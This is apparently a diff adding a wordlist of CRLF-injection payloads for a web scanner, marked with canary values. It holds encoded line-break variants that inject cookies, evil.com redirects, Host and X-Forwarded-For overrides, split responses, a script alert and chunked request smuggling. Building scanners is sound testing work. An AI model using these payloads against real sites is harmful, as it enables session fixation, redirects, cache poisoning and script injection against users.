@@ -1,0 +1,30 @@
+%0d%0aSet-Cookie:crlftest=vortex
+%0d%0aX-Injected:vortex-crlf-test
+%0aSet-Cookie:crlftest=vortex
+%0dSet-Cookie:crlftest=vortex
+%0d%0aLocation:https://evil.com
+%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK
+%0d%0a%0d%0a<script>alert(1)</script>
+\r\nSet-Cookie:crlftest=vortex
+\r\nX-Injected:vortex-crlf-test
+%E5%98%8A%E5%98%8DSet-Cookie:crlftest=vortex
+%c0%8d%c0%8aSet-Cookie:crlftest=vortex
+%250d%250aSet-Cookie:crlftest=vortex
+%25%30%61Set-Cookie:crlftest=vortex
+%25%30d%25%30aSet-Cookie:crlftest=vortex
+%0d%0aHost:evil.com
+%0d%0aX-Forwarded-For:127.0.0.1
+%23%0d%0aSet-Cookie:crlftest=vortex
+%3f%0d%0aSet-Cookie:crlftest=vortex
+%0d%0aSet-Cookie:%20crlftest=vortex
+%0d%0aX-Injected:%20vortex-crlf-test
+%0d%0aLocation:%20https://evil.com
+%u000d%u000aSet-Cookie:crlftest=vortex
+%u000aSet-Cookie:crlftest=vortex
+%0aX-Injected:vortex-crlf-test
+%0d%0a%09Set-Cookie:crlftest=vortex
+%0d%0a Set-Cookie:crlftest=vortex
+%2f%2e%2e%0d%0aSet-Cookie:crlftest=vortex
+%3B%0d%0aSet-Cookie:crlftest=vortex
+%0d%0aReferer:https://evil.com
+%0d%0aTransfer-Encoding:chunked%0d%0a%0d%0a0%0d%0a%0d%0a
